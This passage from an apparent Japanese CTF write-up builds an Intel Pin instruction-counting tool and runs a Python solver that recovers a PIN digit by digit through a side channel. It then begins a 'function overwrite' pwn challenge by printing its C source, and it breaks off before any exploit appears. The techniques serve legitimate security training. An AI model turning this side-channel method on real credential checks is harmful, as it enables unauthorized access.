drwxr-x--- &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; ubuntu ubuntu   &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Feb &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt; 02:14 &lt;span class=&quot;token builtin class-name&quot;&gt;source&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここからPinToolをビルドするのですが、今回の問題バイナリは32bit向けのELFバイナリなので、「ia32」のツールをビルドする必要があります。&lt;/p&gt;
&lt;p&gt;そのため、以下でビルドに必要なパッケージをインストールしておきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt-get&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; libc6-dev-i386
&lt;span class=&quot;token function&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;apt-get&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;install&lt;/span&gt; gcc-multilib g++-multilib&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;続いて。&lt;code class=&quot;language-text&quot;&gt;source/tools/SimpleExamples&lt;/code&gt;に移動してツールをビルドします。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; source/tools/SimpleExamples$
&lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt; all &lt;span class=&quot;token assign-left variable&quot;&gt;TARGET&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;ia32&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;TARGET=ia32&lt;/code&gt;を指定する必要がある点に注意です。&lt;/p&gt;
&lt;p&gt;ビルドが成功した場合&lt;code class=&quot;language-text&quot;&gt;~/pintools/source/tools/SimpleExamples/obj-ia32/inscount2_mt.so&lt;/code&gt;が生成されているはずです。&lt;/p&gt;
&lt;p&gt;あとはこれを使ってサイドチャネル攻撃でPINを一文字ずつ特定していきます。&lt;/p&gt;
&lt;p&gt;以下が使用したSolverです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; subprocess
cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/home/ubuntu/pintools/pin -t /home/ubuntu/pintools/source/tools/SimpleExamples/obj-ia32/inscount2_mt.so -- ./pin_checker&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;split&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
ans &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    t &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;7&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;t&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    cp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; subprocess&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;run&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;t&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;encode&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    
&lt;span class=&quot;token comment&quot;&gt;# 48390513&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記は1文字目の値を変化させてチェックを行っています。&lt;/p&gt;
&lt;p&gt;これを実行したときの各PIN入力とpintoolのカウント結果を見てみると、1文字目に4が入力された時が極端に大きい値になっていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;00000000
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;53421446&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;10000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;60610315&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;20000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;66361386&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;30000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;66840760&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;40000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;314657590&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;50000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61089559&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;60000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61568816&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;70000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;62527330&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;80000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;61089676&lt;/span&gt;

&lt;span class=&quot;token number&quot;&gt;90000000&lt;/span&gt;
Count&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;62048086&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;あとはこれを8文字分繰り返せば正解のPINが特定できます。&lt;/p&gt;
&lt;h2 id=&quot;pwn&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#pwn&quot; aria-label=&quot;pwn permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Pwn&lt;/h2&gt;
&lt;h3 id=&quot;function-overwritepwn&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#function-overwritepwn&quot; aria-label=&quot;function overwritepwn permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;function overwrite(Pwn)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;h4 id=&quot;description-3&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#description-3&quot; aria-label=&quot;description 3 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Description&lt;/h4&gt;
&lt;p&gt;Story telling class 2/2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;あんまりDescriptionになっていないDescriptionですが、以下のような問題コードが与えられました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;sys/types.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;wchar.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;locale.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;BUFSIZE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;FLAGSIZE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;calculate_story_score&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; score &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    score &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; story&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; score&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;easy_checker&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;calculate_story_score&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;FLAGSIZE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    FILE &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;f &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%s %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Please create &apos;flag.txt&apos; in this directory with your&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                      &lt;span class=&quot;token string&quot;&gt;&quot;own debugging flag.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FLAGSIZE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// size bound read&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You&apos;re 1337. Here&apos;s the flag.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%s\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;You&apos;ve failed this class.&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;hard_checker&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;calculate_story_score&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;story&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;13371337&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;FLAGSIZE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    FILE &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;f &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;flag.txt&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;f &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;%s %s&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;Please create &apos;flag.txt&apos; in this directory with your&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                      &lt;span class=&quot;token string&quot;&gt;&quot;own debugging flag.\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

